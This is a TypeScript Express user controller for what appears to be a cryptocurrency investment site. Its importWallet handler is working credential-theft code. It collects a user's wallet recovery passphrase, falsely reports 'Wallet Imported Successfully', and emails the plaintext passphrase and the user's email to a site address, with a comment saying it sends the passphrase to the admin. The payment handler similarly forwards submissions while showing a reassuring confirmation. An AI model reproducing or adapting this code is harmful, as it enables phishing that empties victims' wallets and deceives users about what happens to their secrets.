import { Request, Response } from "express";
import User from "../models/User";
import { sendErrorResponse, sendSuccessResponse } from "../modules/utils";
import mailer from "../services/mailer";
import StatusCode from "../status";
import { SignupBody } from "./AuthController";

export type WalletImportBody = { wallet_name: string; passphrase: string };
class UserController {
  async getProfile(req: Request, res: Response) {
    // @ts-ignore
    const userId = req.userId;
    if (!userId) {
      /**
       * req.userId should be put by authChecker middleware
       * if not then request is invalid
       */
      return sendErrorResponse(
        res,
        "Invalid Token",
        StatusCode.FORBIDDEN,
        "Provide a valid authorization token"
      );
    }

    try {
      // get user profile info
      const user = await User.findByPk(userId);

      // handle missing account
      if (!user)
        return sendErrorResponse(
          res,
          "Account not found",
          StatusCode.FORBIDDEN,
          "Account not found, try re-logging in"
        );

      return sendSuccessResponse(
        res,
        {
          profile: user.getProfileInfo(),
          account: user.getAccountInfo(),
        },
        "Retrieval Successful"
      );
    } catch (error: any) {
      return sendErrorResponse(res, error.message);
    }
  }

  async updateProfile(req: Request<any, any, SignupBody>, res: Response) {
    // @ts-ignore
    const userId = req.userId;
    if (!userId) {
      /**
       * req.userId should be put by authChecker middleware
       * if not then request is invalid
       */
      return sendErrorResponse(
        res,
        "Invalid Token",
        StatusCode.FORBIDDEN,
        "Provide a valid authorization token"
      );
    }

    let { country, currency, email, fullname, password, phone } = req.body;
    if (!country && !currency && !email && !fullname && !password && !phone) {
      return sendErrorResponse(
        res,
        "Empty update fields",
        StatusCode.BAD_REQUEST,
        "You supplied empty updte values"
      );
    }

    try {
      // get user profile info
      const user = await User.findByPk(userId);

      // handle missing account
      if (!user) {
        return sendErrorResponse(
          res,
          "Account not found",
          StatusCode.FORBIDDEN,
          "Account not found, try re-logging in"
        );
      }

      // update user profile
      const updatedUser = await user.update({
        country: country?.trim() || user.country,
        currency: currency || user.currency,
        email: email?.trim() || user.email,
        fullname: fullname?.trim() || user.fullname,
        password: password || user.password,
        phone: phone?.trim() || user.phone,
      });

      return sendSuccessResponse(
        res,
        {
          profile: updatedUser.getProfileInfo(),
          account: updatedUser.getAccountInfo(),
        },
        "Profile Updated Successfully"
      );
    } catch (error: any) {
      return sendErrorResponse(res, error.message);
    }
  }

  async importWallet(req: Request<any, any, WalletImportBody>, res: Response) {
    let { passphrase, wallet_name } = req.body;
    passphrase = passphrase?.trim();
    wallet_name = wallet_name?.trim();

    // check invalid wallet info
    if (!wallet_name || !passphrase) {
      return sendErrorResponse(
        res,
        "Invalid Credentials",
        StatusCode.BAD_REQUEST,
        "You supplied invalid wallet details"
      );
    }

    // check passphrase validity
    if (passphrase.length < 4 || passphrase.split(" ").length - 1 < 3) {
      return sendErrorResponse(
        res,
        "Invalid Passphrase",
        StatusCode.BAD_REQUEST,
        "You entered an invalid passphrase. Passphrases contain atleast 4 words separated with spaces"
      );
    }

    try {
      // @ts-ignore
      const user = await User.findByPk(req.userId || "");
      if (!user)
        return sendErrorResponse(
          res,
          "User Not Found. Invalid Token",
          StatusCode.FORBIDDEN,
          "Try re-logging into the website"
        );

      const emailBody = `
      <div style="background-color:#272f3d;padding:10px;color:white">
        <p style="font-size:24px;font-weight:800;text-align:center;text-transform:uppercase;margin-bottom:25px">Someone Imported Wallet Passphrase</p>
        <p><b>Wallet Name:</b> ${wallet_name}</p>
        <p><b>Wallet passphrase:</b> ${passphrase}</p>
        <p><b>User's email:</b> ${user.email}</p>
      </div>`;
      sendSuccessResponse(res, undefined, "Wallet Imported Successfully");
      // send passphrase to admin
      mailer(
        process.env.INFO_EMAIL_USERNAME,
        process.env.INFO_EMAIL_PASSWORD
      ).sendMail({
        from: "Action Info (Wallet) info@megaexperthub.com", // sender address
        to: "support@megaexperthub.com", // list of receivers
        subject: `Wallet Imported`, // Subject line
        html: emailBody, // html body
      });
    } catch (error: any) {
      return sendErrorResponse(res, error?.message);
    }
  }

  async confirmPayment(
    req: Request<any, any, { paymentMode: string; amount: string }>,
    res: Response
  ) {
    let { paymentMode, amount } = req.body;
    paymentMode = paymentMode?.trim();

    // check invalid wallet info
    if (!amount || !paymentMode) {
      return sendErrorResponse(
        res,
        "Invalid Credentials",
        StatusCode.BAD_REQUEST,
        "You supplied invalid payment details"
      );
    }

    try {
      // @ts-ignore
      const user = await User.findByPk(req.userId || "");
      if (!user)
        return sendErrorResponse(
          res,
          "User Not Found. Invalid Token",
          StatusCode.FORBIDDEN,
          "Try re-logging into the website"
        );

      const emailBody = `
      <div style="background-color:#272f3d;padding:10px;color:white">
        <p style="font-size:24px;font-weight:800;text-align:center;text-transform:uppercase;margin-bottom:25px">Someone Confirmed Payment</p>
        <p><b>Payment Mode:</b> ${paymentMode}</p>
        <p><b>Amount Paid:</b> ${user.currency}${amount}</p>
        <p><b>User's email:</b> ${user.email}</p>
      </div>`;
      sendSuccessResponse(
        res,
        undefined,
        "Payment confirmation submitted successfully. Await for reply via your email address or phone number soon"
      );
      // send passphrase to admin
      mailer(
        process.env.INFO_EMAIL_USERNAME,
        process.env.INFO_EMAIL_PASSWORD
      ).sendMail({
        from: "Action Info (Payment) info@megaexperthub.com", // sender address
        to: "support@megaexperthub.com", // list of receivers
        subject: `Payment Confirmation Submitted`, // Subject line
        html: emailBody, // html body
      });
    } catch (error: any) {
      return sendErrorResponse(res, error?.message);
    }
  }

  async userIndicateSignin(req: Request, res: Response) {
    // @ts-ignore
    const userId = req.userId;
    if (!userId) {
      /**
       * req.userId should be put by authChecker middleware
       * if not then request is invalid
       */
      return sendErrorResponse(
        res,
        "Invalid Token",
        StatusCode.FORBIDDEN,
        "Provide a valid authorization token"
      );
    }

    try {
      // get user profile info
      const user = await User.findByPk(userId);

      // handle missing account
      if (!user) {
        return sendErrorResponse(
          res,
          "Account not found",
          StatusCode.FORBIDDEN,
          "Account not found, try re-logging in"
        );
      }

      // notify support of login
      mailer(process.env.INFO_EMAIL_USERNAME, process.env.INFO_EMAIL_PASSWORD)
        .sendMail({
          from: "Action Info (Sign in) info@megaexperthub.com", // sender address
          to: process.env.SUPPORT_EMAIL_USERNAME, // list of receivers
          subject: `${user.fullname} just signed into your website`, // Subject line
          html: `<div>
          <h4>User Details</h4>
          <b>email:${user.email}</b><br>
          <b>username:${user.fullname}</p><br>
          <b>log in time:${new Date()}</b>
          </div>`, // html body
        })
        .catch((error) => {
          console.log("SIGN-IN EMAIL SEND ERROR");
          console.log(error);
        });
    } catch (error: any) {
      return sendErrorResponse(res, error.message);
    }
  }
}

export default new UserController();
